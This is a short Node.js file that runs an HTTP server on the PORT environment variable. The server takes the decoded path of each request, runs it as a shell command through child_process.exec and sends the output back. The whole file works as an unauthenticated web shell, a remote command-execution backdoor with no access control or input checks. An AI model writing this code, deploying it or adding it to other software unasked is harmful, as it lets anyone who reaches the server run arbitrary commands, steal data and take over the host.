const { exec } = require('child_process');
const http = require('http');

var result = "";
function dataFunc(data) {
	console.log(data);
	result += data + '\n';
}

const server = http.createServer((req, res) => {
	result = "";
	var c = decodeURIComponent(req.url.substring(1));
	console.log(c);
	var e = exec(c);

	e.stdout.on('data', dataFunc);
	e.stderr.on('data', dataFunc);

	e.on('close', (code) => {
		res.setHeader('Content-Type', 'text/plain');
		res.statusCode = !code ? 200 : 400;
		res.end(result);
	});
});
server.listen(process.env.PORT);